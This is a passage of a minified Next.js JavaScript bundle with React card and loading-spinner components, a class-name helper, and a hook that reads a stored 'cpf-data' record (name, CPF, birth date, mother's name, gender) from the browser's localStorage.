          ...a
        } = e;
        return (0, r.jsx)("div", {
          className: (0, s.cn)(
            "w-full max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden",
            t),
          ...a
        })
      }

      function n(e) {
        let {
          children: t,
          className: a,
          ...l
        } = e;
        return (0, r.jsx)("div", {
          className: (0, s.cn)("flex items-center gap-2 mb-2", a),
          ...l,
          children: t
        })
      }

      function i(e) {
        let {
          className: t,
          ...a
        } = e;
        return (0, r.jsx)("div", {
          className: (0, s.cn)("p-4 space-y-6", t),
          ...a
        })
      }
    },
    6325: (e, t, a) => {
      "use strict";
      a.d(t, {
        a: () => l
      });
      var r = a(5155),
        s = a(1154);

      function l() {
        return (0, r.jsx)("div", {
          className: "fixed inset-0 z-50 flex items-center justify-center",
          style: {
            background: "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)"
          },
          children: (0, r.jsx)(s.A, {
            className: "size-10 rounded-full animate-spin text-white"
          })
        })
      }
    },
    6929: (e, t, a) => {
      "use strict";
      a.d(t, {
        B: () => l
      });
      var r = a(2115),
        s = a(1884);

      function l() {
        let [e, t] = (0, r.useState)(null), [a, l] = (0, r.useState)(!0);
        (0, r.useEffect)(() => {
          let e = localStorage.getItem("cpf-data");
          if (e) try {
            let a = JSON.parse(e);
            t(a)
          } catch (e) {
            localStorage.removeItem("cpf-data"), t(null)
          }
          l(!1)
        }, []);
        let n = (0, r.useMemo)(() => (null == e ? void 0 : e.name) ? (0, s
            .kR)(e.name) : null, [null == e ? void 0 : e.name]),
          i = (0, r.useMemo)(() => (null == e ? void 0 : e.firstName) ? (
            0, s.kR)(e.firstName) : null, [null == e ? void 0 : e
            .firstName
          ]),
          o = (0, r.useMemo)(() => (null == e ? void 0 : e.motherName) ? (
            0, s.kR)(e.motherName) : null, [null == e ? void 0 : e
            .motherName
          ]),
          c = (null == e ? void 0 : e.cpf) || null,
          u = (null == e ? void 0 : e.birthDate) || null;
        return {
          isLoading: a,
          isEmpty: !e,
          isInvalid: !n || !c || !u || !o,
          name: n,
          firstName: i,
          cpf: c,
          birthDate: u,
          motherName: o,
          gender: (null == e ? void 0 : e.gender) || null,
          full: e
        }
      }
    },
    9434: (e, t, a) => {
      "use strict";
      a.d(t, {
        cn: () => l
      });
      var r = a(2596),
        s = a(9688);

      function l() {
        for (var e = arguments.length, t = Array(e), a = 0; a < e; a++) t[
          a] = arguments[a];
        return (0, s.QP)((0, r.$)(t))
      }
    }
  },
  e => {
    var t = t => e(e.s = t);
    e.O(0, [711, 588, 635, 766, 279, 813, 441, 684, 358], () => t(1764)),
      _N_E = e.O()
  }
]);